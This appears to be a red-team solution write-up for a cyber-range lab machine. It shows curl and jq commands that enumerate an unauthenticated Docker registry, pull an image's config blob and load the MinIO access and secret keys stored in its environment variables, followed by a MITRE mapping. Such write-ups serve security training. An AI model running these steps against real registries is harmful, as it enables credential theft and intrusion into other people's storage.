# solve_red.md — M2 · dev-registry
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M2 — PUL Container Registry
**Vulnerability:** Unauthenticated Docker Registry v2 API + Credentials in Image Config ENV Blob
**MITRE:** T1552.001 (Credentials in Files) · T1613 (Container and Resource Discovery)
**Severity:** Hard | **Operator:** Rudra-7

---
## Objective
Use the artifact downloaded from M1 to identify the registry credential if needed. Registry read endpoints in this lab are accessible without authentication. Pull the firmware-builder image manifest and config blob, then load the MinIO values from its environment metadata.

---
## Step-by-Step

### Step 1 — Discover Registry
```bash
curl --max-time 8 -fsS http://203.0.3.36:5000/v2/
# Returns: {} with Docker-Distribution-Api-Version: registry/2.0 header
```




### Step 2 — Enumerate Repositories (unauthenticated)
```bash
curl --max-time 8 -fsS http://203.0.3.36:5000/v2/_catalog
# {"repositories":["pul/firmware-builder","pul/sonar-runner"]}
```




### Step 3 — Get Tags
```bash
curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/tags/list
# {"name":"pul/firmware-builder","tags":["latest","v3.2.1","v3.1.0","v3.0.5"]}
```




### Step 4 — Get Manifest (extract config digest)
```bash
curl --max-time 8 -fsS http://203.0.3.36:5000/v2/pul/firmware-builder/manifests/latest | jq .
```
Note the config digest: `sha256:a4f3c2b1e8d7...`




### Step 5 — Download Config Blob (contains ENV with credentials)
```bash
DIGEST="sha256:a4f3c2b1e8d7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1"
curl --max-time 8 -fsS "http://203.0.3.36:5000/v2/pul/firmware-builder/blobs/${DIGEST}" -o "$RANGE3_DIR/registry-config.json"
printf 'ENV keys: %s\n' "$(jq -r '[.config.Env[] | split("=")[0]] | join(", ")' "$RANGE3_DIR/registry-config.json")"
export MINIO_ACCESS_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_ACCESS_KEY=")) | sub("^[^=]*=";"")' "$RANGE3_DIR/registry-config.json")"
export MINIO_SECRET_KEY="$(jq -r '.config.Env[] | select(startswith("MINIO_SECRET_KEY=")) | sub("^[^=]*=";"")' "$RANGE3_DIR/registry-config.json")"
printf 'MinIO credentials loaded into this shell; values not printed.\n'
```



ENV layer reveals:
```
"ARTIFACT_STORE_HOST=11.x.x.x"
"ARTIFACT_STORE_PORT=9000"
"MINIO_ACCESS_KEY=<redacted>"
"MINIO_SECRET_KEY=<redacted>"
```

The image configuration also contains the literal host placeholder `11.x.x.x`; in this deployment the artifact store is reachable at `203.0.3.36:9000`.

**Pivot:** MinIO values are loaded into `MINIO_ACCESS_KEY` and `MINIO_SECRET_KEY`; the M3 bucket endpoints in this lab are public. Treat both values as compromised and lab-only.

---
## MITRE Mapping
| Tactic | Technique | ID |
|---|---|---|
| Discovery | Container and Resource Discovery | T1613 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
